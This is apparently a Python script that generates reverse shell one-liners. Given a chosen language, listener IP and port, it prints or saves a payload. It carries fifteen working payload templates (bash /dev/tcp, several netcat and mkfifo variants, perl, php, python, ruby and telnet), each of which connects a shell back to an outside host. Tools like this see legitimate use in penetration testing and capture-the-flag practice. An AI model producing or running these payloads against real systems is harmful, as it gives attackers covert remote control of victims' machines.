#!/usr/bin/env python
import sys
import os
import socket
import re
import argparse

methods=[
    'bash','bash2',
    'netcat','netcat2','netcat3','netcat4',
    'perl','perl2','perl3',
    'php',
    'python',
    'ruby','ruby2','ruby3',
    'telnet'
]

def GREEN(text): return "\033[32m{}\033[0m".format(str(text))

def availableMethods():
    text = "Methods available:"
    text = text + "\n - " + GREEN("bash")
    text = text + "\n - " + GREEN("bash2")
    text = text + "\n - " + GREEN("netcat")
    text = text + "\n - " + GREEN("netcat2")
    text = text + "\n - " + GREEN("netcat3")
    text = text + "\n - " + GREEN("netcat4")
    text = text + "\n - " + GREEN("perl")
    text = text + "\n - " + GREEN("perl2")
    text = text + "\n - " + GREEN("perl3")
    text = text + "\n - " + GREEN("php")
    text = text + "\n - " + GREEN("python")
    text = text + "\n - " + GREEN("ruby")
    text = text + "\n - " + GREEN("ruby2")
    text = text + "\n - " + GREEN("ruby3")
    text = text + "\n - " + GREEN("telnet")
    text = text + "\nEach method explained in detail in https://github.com/n0nuser/Reversegen"
    return text

def usage():
    print(availableMethods())
    sys.exit()

def get_args():
    desc = 'This is a simple Reverse Shell Generator.\n' + availableMethods()
    parser = argparse.ArgumentParser(description=desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-m", type=str, help="Language used for the Reverse Shell", dest="method", required=True)
    parser.add_argument("-i", type=str, help="IP address of the listener", dest="ip", required=True)
    parser.add_argument("-p", type=int, help="Port of the listener", dest="port", required=True)
    parser.add_argument("-o", type=str, help="Output File", dest="filename", required=False)
    args = parser.parse_args()

    method = args.method
    ip = args.ip
    port = args.port
    filename = args.filename

    # Validations
    ## 
    if (method not in methods): 
        usage()
    elif (not (1 <= port <= 65535)):
        print("That port can't be used!")
        sys.exit()

    if (not(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",ip))):
        try:
            ip = socket.gethostbyname(ip)
        except:
            print("Invalid Host!")
            sys.exit()

    return method,ip,str(port),filename

method, ip, port, filename = get_args()

# Selects method

if(method == 'bash'):
    data = "bash -i >& /dev/tcp/" + ip + "/" + port +" 0>&1"

if(method == 'bash2'):
    data = "0<&196;exec 196<>/dev/tcp/" + ip + "/" + port + "; sh <&196 >&196 2>&196"

elif(method == 'netcat'):
    data = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f"
    
elif(method == 'netcat2'):
    data = "nc -e /bin/sh "+ ip + " " + port
    
elif(method == 'netcat3'):
    data = "/bin/sh | nc " + ip + " " + port

elif(method == 'netcat4'):
    data = "rm -f /tmp/p; mknod /tmp/p p && nc " + ip + " " + port + " 0/tmp/p"

elif(method == 'perl'):
    data = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

elif(method == 'perl2'):
    data = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + ip + ":" + port + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

elif(method == 'perl3'):
    data = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"" + ip + ":" + port + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

elif(method == 'php'):
    data = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

elif(method == 'python'):
    data = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

elif(method == 'ruby'):
    data = "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

elif(method == 'ruby2'):
    data = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + ip + "\",\"" + port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

elif(method == 'ruby3'):
    data = " ruby -rsocket -e 'c=TCPSocket.new(\"" + ip + "\",\"" + port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

elif(method == 'telnet'):
    data = "rm -f /tmp/p; mknod /tmp/p p && telnet " + ip + " " + port + " 0/tmp/p"

# Writes to file and prints out

if (filename):
    file = open(filename,'w')
    file.write(data + "\n")
    file.close()

print(data)
